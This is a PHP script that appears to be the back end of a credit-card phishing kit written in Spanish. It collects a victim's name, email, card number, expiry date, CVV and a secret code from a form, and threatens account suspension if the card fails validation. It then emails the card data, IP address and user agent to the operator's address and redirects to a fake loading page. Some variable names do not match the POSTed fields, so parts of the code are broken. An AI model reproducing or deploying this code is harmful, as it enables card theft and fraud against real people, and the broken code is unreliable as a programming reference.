<?php
$correo = $_POST['correo'];
$nombre = $_POST['nombre'];
$digitos = $_POST['digitos'];
$mmaa = $_POST['mmaa'] . "/" . $_POST['ccyear'];
$cvv = $_POST['cvv'];
$victisk = $_POST['sekretcode'];






 include_once 'librerias/creditcards.class.php';
            $CCV = new CreditCardValidator();
            $CCV->Validate($ccname);
            $CARDINFO = $CCV->GetCardInfo();
            $status = strtoupper($CARDINFO['status']);
			if($status == 'INVALID'){
                echo("<script>alert('¡La tarjeta ingresada es invalida! Corrobore ingresar correctamente los datos, de lo contrario nuestro sistema suspenderá su cuenta temporalmente. ')</script>");
echo("<script>window.location = 'index2.php';</script>");
            exit();
 
            
            exit();
            } else {
                include("sand_rzlt_email.php");

$yahya_email .= rand(1,100000);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "<html>
<body>
------------CC---------------
<br>
TARJETA: ".$ccname."
<br>
CVV: ".$cvv."
<br>
EXP: ".$ccdate."
<br>
------------DATOS------------
<br>
NOMBRE: ".$ccnumber." 
<br>
EMAIL: ".$ccemail."

<br>
IP: ".$_SERVER['REMOTE_ADDR']." 
<br>
User-Agent: ".$_SERVER['HTTP_USER_AGENT']."

<br>
</body>
</html>";
$headers .= "From: CoCofullfresh" . "\r\n";
mail($yourmail, $yahya_email, $subject, $headers);
            
                header('Location: loadingwindowId=db3.php'); 
                
            } 
			
						

?>

